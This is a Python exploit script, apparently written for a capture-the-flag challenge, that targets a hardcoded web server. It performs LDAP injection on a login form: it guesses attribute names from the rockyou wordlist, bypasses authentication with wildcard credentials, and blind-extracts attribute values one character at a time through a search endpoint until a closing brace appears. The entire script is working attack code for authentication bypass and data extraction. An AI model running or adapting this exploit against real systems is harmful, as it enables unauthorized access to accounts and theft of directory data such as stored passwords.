#!/usr/bin/python3

import requests as req
import string

proto = "http"
ip = "157.245.40.149"
port = "30697"
baseurl = proto + "://" + ip + ":" + port
url1 = baseurl + "/login"
url2 = baseurl + "/search"
failed_status = 302


# Using readlines() 
rockyou = open('rockyou.txt', 'r', encoding="ISO-8859-1") 
lines = rockyou.readlines() 

print("[*] Loaded " + str(rockyou.name))

# Step 1 - enum active fields from login page
count = 0
start = 0
activeFields = ["mypassword"]

try:
    for field in lines[start:]: 
        query = "*)(" + field.strip() + "=*"
        #print("username=\"" + query + "\" password=\""+ query + "\"")
        data = { "username":query, "password":query }
        s = req.Session()
        r = s.post(url1, data=data, allow_redirects=False)

        if r.headers["Location"] == "/":
            print("[*] Found active field --> " + field.strip())
            activeFields.append(field.strip())
        #else:    
            #print("failed")

        count+=1
except:
    print("[-] Error!! Last tested --> " + str(count))
    exit(1)

# Step 2 - get a session cookie
data = { "username":"*", "password":"*" }
s = req.Session()
r = s.post(url1, data=data, allow_redirects=True)


# Step 3 - dump active fields
chars = string.printable
dump = ""
loop = True

for fld in activeFields:
    while loop:
        for c in chars:
            if c in "\'\"\\\*":
                continue
            #query = 'xxx)(sn=Father'    
            query = "xxx)(" + str(fld) + "=" + dump + c + "*"
            json = {"term":query}
            r = s.post(url2, json=json)

            if r.status_code != 500 and len(r.text) > 2:
                dump += c
                print("[*] "+ fld + " --> "+ dump)
                if c == "}":
                    loop = False